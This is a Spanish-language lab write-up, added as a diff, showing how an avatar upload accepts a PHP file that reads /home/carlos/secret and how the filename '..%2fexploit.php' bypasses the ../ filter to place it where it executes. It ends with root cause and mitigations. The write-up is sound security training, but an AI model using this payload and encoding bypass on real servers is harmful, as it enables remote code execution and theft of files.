@@ -1,0 +1,295 @@
+# Unrestricted File Upload mediante Directory Traversal
+
+## 1. Descripción de la vulnerabilidad
+
+La aplicación dispone de una funcionalidad para subir imágenes utilizadas como avatar. Durante las pruebas se observa que permite subir archivos con extensión `.php`.
+
+Sin embargo, los archivos PHP almacenados dentro del directorio destinado a los avatares no son ejecutados por el servidor, sino que se devuelven como texto plano.
+
+La vulnerabilidad aparece al combinar esta funcionalidad con un **Directory Traversal en el nombre del archivo**. El servidor intenta filtrar la secuencia `../`, pero es posible evadir este filtro mediante URL encoding del carácter `/`.
+
+Esto permite modificar la ubicación final del archivo y colocarlo fuera del directorio de avatares, donde posteriormente el servidor puede interpretar y ejecutar el código PHP.
+
+---
+
+## 2. Identificación de la funcionalidad vulnerable
+
+Después de iniciar sesión, se accede a **My account** y se sube una imagen como avatar.
+
+En **Burp Suite → Proxy → HTTP history** se observa que el avatar se obtiene mediante una petición similar a:
+
+```http
+GET /files/avatars/<YOUR-IMAGE> HTTP/2
+```
+
+También se identifica la petición responsable de la subida:
+
+```http
+POST /my-account/avatar
+```
+
+Ambas peticiones son enviadas a **Burp Repeater** para analizar y modificar su comportamiento.
+
+---
+
+## 3. Creación del archivo malicioso
+
+Se crea un archivo denominado:
+
+```text
+exploit.php
+```
+
+con el siguiente contenido:
+
+```php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+El objetivo es comprobar si conseguimos que el servidor interprete el archivo como PHP y ejecute su contenido.
+
+---
+
+## 4. Comprobación de la ejecución del archivo
+
+El archivo `exploit.php` se sube inicialmente utilizando la funcionalidad de avatar.
+
+Posteriormente se modifica en Burp Repeater la petición del avatar para solicitar:
+
+```http
+GET /files/avatars/exploit.php HTTP/2
+```
+
+La aplicación devuelve:
+
+```php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+en texto plano.
+
+Esto demuestra que, aunque el archivo PHP puede ser almacenado, **el directorio `/files/avatars/` no permite su ejecución**.
+
+Por tanto, necesitamos conseguir que el archivo sea almacenado en una ubicación diferente.
+
+---
+
+## 5. Prueba de Directory Traversal
+
+Se analiza la petición:
+
+```http
+POST /my-account/avatar
+```
+
+Dentro del cuerpo `multipart/form-data` se encuentra:
+
+```http
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+```
+
+Se modifica el nombre del archivo para intentar realizar Directory Traversal:
+
+```http
+Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
+```
+
+Al enviar la petición, la aplicación responde:
+
+```text
+The file avatars/exploit.php has been uploaded.
+```
+
+Esto indica que la aplicación está eliminando o normalizando la secuencia `../`.
+
+---
+
+## 6. Bypass mediante URL Encoding
+
+Para evitar este filtro, se codifica el carácter `/` mediante URL encoding.
+
+La petición se modifica a:
+
+```http
+Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
+```
+
+Al enviar la petición, la aplicación responde:
+
+```text
+The file avatars/../exploit.php has been uploaded.
+```
+
+Este comportamiento es significativo porque demuestra que el servidor está procesando posteriormente `%2f` como `/`.
+
+Por tanto:
+
+```text
+..%2fexploit.php
+```
+
+termina siendo interpretado como:
+
+```text
+../exploit.php
+```
+
+permitiendo realizar el Directory Traversal.
+
+---
+
+## 7. Explotación
+
+La combinación de ambos comportamientos permite escapar del directorio:
+
+```text
+/files/avatars/
+```
+
+y colocar el archivo en el directorio superior:
+
+```text
+/files/
+```
+
+Por tanto, el archivo pasa a estar disponible como:
+
+```text
+/files/exploit.php
+```
+
+Al solicitar:
+
+```http
+GET /files/exploit.php HTTP/2
+```
+
+el servidor interpreta el archivo como PHP y ejecuta:
+
+```php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+La respuesta contiene entonces el secreto almacenado en:
+
+```text
+/home/carlos/secret
+```
+
+El secreto obtenido se introduce en **Submit solution**, completando el laboratorio.
+
+---
+
+## 8. Cadena de explotación
+
+```text
+Subida de archivo PHP
+        ↓
+exploit.php
+        ↓
+/files/avatars/exploit.php
+        ↓
+El PHP se devuelve como texto
+        ↓
+Prueba de ../
+        ↓
+La aplicación elimina ../
+        ↓
+Bypass mediante ..%2f
+        ↓
+El servidor decodifica %2f
+        ↓
+Directory Traversal
+        ↓
+/files/exploit.php
+        ↓
+El servidor ejecuta PHP
+        ↓
+Lectura de /home/carlos/secret
+        ↓
+Obtención del secreto
+```
+
+---
+
+## 9. Impacto
+
+La vulnerabilidad permite combinar una **subida de archivos no restringida adecuadamente** con un **Directory Traversal** en el nombre del archivo.
+
+Por separado, la subida de PHP no resulta inmediatamente explotable porque los archivos almacenados en `/files/avatars/` se sirven como texto.
+
+Sin embargo, el Directory Traversal permite colocar el archivo en un directorio diferente donde el servidor sí procesa código PHP.
+
+En un entorno real, este tipo de vulnerabilidad puede conducir a **Remote Code Execution (RCE)** y permitir al atacante ejecutar código con los privilegios del proceso web.
+
+El impacto final dependerá de los permisos del usuario con el que se ejecuta el servidor y de los recursos accesibles desde ese contexto.
+
+---
+
+## 10. Causa raíz
+
+La vulnerabilidad se produce por una combinación de errores en el procesamiento de archivos subidos:
+
+* El servidor permite subir archivos PHP.
+* El nombre proporcionado por el usuario se utiliza durante el almacenamiento.
+* La aplicación intenta filtrar `../`, pero el filtro puede evadirse mediante encoding.
+* La ruta final del archivo no se valida de forma segura después de la decodificación.
+* Los archivos pueden terminar en un directorio donde el servidor interpreta código PHP.
+
+El problema fundamental es **confiar en el nombre y la ruta proporcionados por el cliente para determinar la ubicación del archivo almacenado**.
+
+---
+
+## 11. Recomendaciones de mitigación
+
+### Validación de archivos
+
+Utilizar una lista blanca de formatos permitidos y validar tanto:
+
+* Extensión.
+* MIME type.
+* Contenido real del archivo mediante análisis de sus bytes/magic numbers.
+
+No confiar exclusivamente en el `Content-Type` proporcionado por el cliente.
+
+### Generación de nombres
+
+No utilizar directamente el nombre proporcionado mediante:
+
+```text
+filename=
+```
+
+Es preferible generar un nombre aleatorio en el servidor, por ejemplo mediante un UUID.
+
+### Prevención de Directory Traversal
+
+Normalizar y validar la ruta final antes de almacenar el archivo.
+
+Además, debe comprobarse que la ruta resultante permanezca dentro del directorio destinado a las subidas.
+
+### Deshabilitar ejecución
+
+Los archivos subidos por los usuarios deberían almacenarse en un directorio donde **no sea posible ejecutar código del lado del servidor**.
+
+Por ejemplo, un servidor web puede configurarse para impedir la interpretación de PHP dentro del directorio de uploads.
+
+### Separación de permisos
+
+El proceso web debería ejecutarse con los mínimos privilegios necesarios, limitando el acceso a archivos sensibles del sistema.
+
+---
+
+## 12. Conclusión
+
+El laboratorio demuestra cómo dos controles aparentemente independientes pueden combinarse para conseguir una explotación completa.
+
+La aplicación permitía subir `exploit.php`, pero inicialmente el archivo únicamente se servía como texto. El segundo fallo, un Directory Traversal en el nombre del archivo, permitió escapar de `/files/avatars/` utilizando:
+
+```text
+..%2fexploit.php
+```
+
+Una vez situado el archivo en `/files/exploit.php`, el servidor pudo interpretarlo como PHP y ejecutar el código que accedía a `/home/carlos/secret`.
+
+La lección principal es que **la seguridad de una funcionalidad de upload no depende únicamente de bloquear determinadas extensiones**. Es necesario controlar simultáneamente el tipo de archivo, el nombre, la ruta de almacenamiento, la normalización de rutas y la posibilidad de ejecución en el directorio de subida.
